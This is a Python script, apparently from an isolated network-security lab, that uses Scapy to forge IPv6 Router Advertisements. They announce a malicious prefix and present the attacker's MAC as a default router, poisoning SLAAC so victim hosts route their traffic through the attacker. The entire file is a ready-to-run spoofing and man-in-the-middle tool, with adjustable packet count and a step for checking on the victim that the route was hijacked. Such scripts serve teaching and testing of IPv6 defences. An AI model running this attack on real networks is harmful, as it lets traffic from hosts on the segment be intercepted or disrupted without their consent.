#!/usr/bin/env python3
"""
fake_ra.py — RA (Router Advertisement) frauduleux, annonçant un préfixe
malveillant pour détourner le trafic des hôtes victimes (SLAAC empoisonné).

⚠️ Labo isolé uniquement (namespace "attaquant").

Usage :
    sudo python3 fake_ra.py --iface eth1
"""
import argparse
from scapy.all import (
    Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr, sendp
)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--attacker-mac", default="02:00:00:00:00:66")
    p.add_argument("--evil-prefix", default="2001:db8:bad::")
    p.add_argument("--count", type=int, default=5)
    p.add_argument("--inter", type=float, default=1.0)
    args = p.parse_args()

    pkt = (
        Ether(src=args.attacker_mac, dst="33:33:00:00:00:01") /
        IPv6(src="fe80::66", dst="ff02::1") /
        ICMPv6ND_RA(routerlifetime=1800) /
        ICMPv6NDOptPrefixInfo(prefix=args.evil_prefix, prefixlen=64,
                               validlifetime=86400, preferredlifetime=14400) /
        ICMPv6NDOptSrcLLAddr(lladdr=args.attacker_mac)
    )
    sendp(pkt, iface=args.iface, count=args.count, inter=args.inter)
    print(f"{args.count} RA frauduleux envoyés, préfixe annoncé : {args.evil_prefix}")
    print("Vérification côté victime : `ip -6 route show` doit révéler une "
          "route via ce préfixe si l'attaque a réussi.")


if __name__ == "__main__":
    main()
